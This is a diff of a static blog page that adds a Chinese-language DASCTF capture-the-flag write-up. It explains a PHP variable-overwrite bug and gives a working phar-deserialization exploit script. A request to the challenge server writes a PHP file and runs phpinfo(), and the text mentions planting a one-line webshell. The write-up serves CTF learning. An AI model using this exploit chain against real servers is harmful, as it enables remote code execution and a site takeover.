@@ -4,14 +4,14 @@
         <meta charset="utf-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="description" content="None">
         
         
-        <link rel="shortcut icon" href="img/favicon.ico">
-        <title>hkk_blog</title>
-        <link href="css/bootstrap-custom.min.css" rel="stylesheet">
-        <link href="css/font-awesome.min.css" rel="stylesheet">
-        <link href="css/base.css" rel="stylesheet">
+        
+        <link rel="shortcut icon" href="../../img/favicon.ico">
+        <title>DASCTF - hkk_blog</title>
+        <link href="../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
         <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
         <!--[if lt IE 9]>
@@ -19,13 +19,13 @@
             <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
         <![endif]-->
 
-        <script src="js/jquery-1.10.2.min.js" defer></script>
-        <script src="js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../js/bootstrap-3.0.3.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
 
-    <body class="homepage">
+    <body>
 
         <div class="navbar navbar-default navbar-fixed-top" role="navigation">
             <div class="container">
@@ -39,50 +39,50 @@
                         <span class="icon-bar"></span>
                         <span class="icon-bar"></span>
                     </button>
-                    <a class="navbar-brand" href=".">hkk_blog</a>
+                    <a class="navbar-brand" href="../..">hkk_blog</a>
                 </div>
 
                 <!-- Expanded navigation -->
                 <div class="navbar-collapse collapse">
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
-                            <li class="active">
-                                <a href=".">Welcome to hkkblog</a>
+                            <li >
+                                <a href="../..">Welcome to hkkblog</a>
                             </li>
-                            <li class="dropdown">
+                            <li class="dropdown active">
                                 <a href="#" class="dropdown-toggle" data-toggle="dropdown">Articl <b class="caret"></b></a>
                                 <ul class="dropdown-menu">
                                     
-<li >
-    <a href="articl/DASCTF/">DASCTF</a>
+<li class="active">
+    <a href="./">DASCTF</a>
 </li>
                                     
 <li >
-    <a href="articl/[HTB]DT/">[HTB]Docter</a>
+    <a href="../[HTB]DT/">[HTB]Docter</a>
 </li>
                                     
 <li >
-    <a href="articl/[HTB]Laboratory/">[HTB]Laboratory</a>
+    <a href="../[HTB]Laboratory/">[HTB]Laboratory</a>
 </li>
                                     
 <li >
-    <a href="articl/docker和phpstorm搭建php开发环境/">docker和phpstorm搭建php开发环境</a>
+    <a href="../docker和phpstorm搭建php开发环境/">docker和phpstorm搭建php开发环境</a>
 </li>
                                     
 <li >
-    <a href="articl/isoon/">ISOON</a>
+    <a href="../isoon/">ISOON</a>
 </li>
                                     
 <li >
-    <a href="articl/ssh隧道/">ssh隧道</a>
+    <a href="../ssh隧道/">ssh隧道</a>
 </li>
                                     
 <li >
-    <a href="articl/初探pickle反序列化/">初探pickle反序列化</a>
+    <a href="../初探pickle反序列化/">初探pickle反序列化</a>
 </li>
                                     
 <li >
-    <a href="articl/发财writeup/">HXB writeup</a>
+    <a href="../发财writeup/">HXB writeup</a>
 </li>
                                 </ul>
                             </li>
@@ -94,13 +94,13 @@
                                 <i class="fa fa-search"></i> Search
                             </a>
                         </li>
-                            <li class="disabled">
-                                <a rel="next" >
+                            <li >
+                                <a rel="next" href="../..">
                                     <i class="fa fa-arrow-left"></i> Previous
                                 </a>
                             </li>
                             <li >
-                                <a rel="prev" href="articl/DASCTF/">
+                                <a rel="prev" href="../[HTB]DT/">
                                     Next <i class="fa fa-arrow-right"></i>
                                 </a>
                             </li>
@@ -112,12 +112,119 @@
         <div class="container">
                 <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
     <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#welcome-to-hkkblog">Welcome to hkkblog</a></li>
+        <li class="main active"><a href="#dasctf">DASCTF</a></li>
     </ul>
 </div></div>
                 <div class="col-md-9" role="main">
 
-<h1 id="welcome-to-hkkblog">Welcome to hkkblog</h1></div>
+<h1 id="dasctf">DASCTF</h1>
+<p>审计源码发现有变量覆盖漏洞，可以把template覆盖，配合file_get_contents造成任意文件读取</p>
+<p>尝试读template.php</p>
+<pre><code>?var[template][1]=template.php&amp;tp=1
+</code></pre>
+
+<pre><code class="php">&lt;?php
+class Template{
+    public $content;
+    public $pattern;
+    public $suffix;
+
+    public function __construct($content){
+        $this-&gt;content = $content;
+        $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
+        $this-&gt;suffix = &quot;.html&quot;;
+    }
+
+    public function __destruct() {
+        $this-&gt;render();
+     }
+    public function render() {
+        while (True) {
+            if(preg_match($this-&gt;pattern, $this-&gt;content, $matches)!==1)
+                break;
+            global ${$matches[1]};
+
+            if(isset(${$matches[1]})) {
+                $this-&gt;content = preg_replace($this-&gt;pattern, ${$matches[1]}, $this-&gt;content);
+            }
+            else{
+                break;
+            }
+        }
+        if(strlen($this-&gt;suffix)&gt;5) {
+            echo &quot;error suffix&quot;;
+            die();
+        }
+        $filename = '/var/www/html/test/uploads/' . md5($_SERVER['REMOTE_ADDR']) . &quot;/&quot; . md5($this-&gt;content) . $this-&gt;suffix;
+        file_put_contents($filename, $this-&gt;content);
+        echo &quot;Your html file is in &quot; . $filename;
+    }
+}
+
+?&gt;
+</code></pre>
+
+<p>很明显可以使用phar反序列化写文件</p>
+<p>render()方法中会正则匹配<code>{{}}</code>里内容，然后当作全局变量使用，这样我们可以使用前面的任意变量覆盖对参数进行修改</p>
+<pre><code class="php">&lt;?php
+class Template{
+    public $content;
+    public $pattern;
+    public $suffix;
+
+    public function __construct($content){
+        $this-&gt;content = $content;
+        $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
+        $this-&gt;suffix = &quot;.php&quot;;
+    }
+
+    public function __destruct() {
+        $this-&gt;render();
+    }
+    public function render() {
+        while (True) {
+            if(preg_match($this-&gt;pattern, $this-&gt;content, $matches)!==1)
+                break;
+            global ${$matches[1]};
+
+            if(isset(${$matches[1]})) {
+                $this-&gt;content = preg_replace($this-&gt;pattern, ${$matches[1]}, $this-&gt;content);
+            }
+            else{
+                break;
+            }
+        }
+        if(strlen($this-&gt;suffix)&gt;5) {
+            echo &quot;error suffix&quot;;
+            die();
+        }
+        $filename = '/var/www/html/uploads/' . md5($_SERVER['REMOTE_ADDR']) . &quot;/&quot; . md5($this-&gt;content) . $this-&gt;suffix;
+        file_put_contents($filename, $this-&gt;content);
+        echo &quot;Your html file is in &quot; . $filename;
+    }
+}
+
+$phar=new Phar('phar.phar');
+$a=new Template();
+$a-&gt;content=&quot;&lt;?php {{abc}} ?&gt;&quot;;
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString('test.txt','text');
+$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');
+$phar-&gt;setMetadata($a);
+$phar-&gt;stopBuffering();
+</code></pre>
+
+<p>我们将生成的phar文件上传再调用触发反序列化</p>
+<p><img alt="image-20201226131349024" src="../../img/image-20201226131349024.png" /></p>
+<pre><code>http://8.129.41.25:10305?var[template][1]=phar:///var/www/html/test/uploads/723ee8e952c6c25ff6277a2f95c77a08/d78ae792e3958c6c8da2e7a8f9de9391.html&amp;tp=1&amp;abc=phpinfo();
+</code></pre>
+
+<p><img alt="image-20201226131314432" src="../../img/image-20201226131314432.png" /></p>
+<p>我们成功生成了php文件</p>
+<p><img alt="image-20201226131436427" src="../../img/image-20201226131436427.png" /></p>
+<p>成功执行命令</p>
+<p>我们传入一句话木马成功拿到flag</p>
+<p><img alt="image-20201226131624759" src="../../img/image-20201226131624759.png" /></p></div>
         </div>
 
         <footer class="col-md-12">
@@ -125,11 +232,11 @@
             <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
         </footer>
         <script>
-            var base_url = ".",
+            var base_url = "../..",
                 shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
         </script>
-        <script src="js/base.js" defer></script>
-        <script src="search/main.js" defer></script>
+        <script src="../../js/base.js" defer></script>
+        <script src="../../search/main.js" defer></script>
 
         <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
     <div class="modal-dialog">
@@ -197,8 +304,3 @@
 
     </body>
 </html>
-
-<!--
-MkDocs version : 1.0.4
-Build Date UTC : 2020-12-26 05:28:11
--->
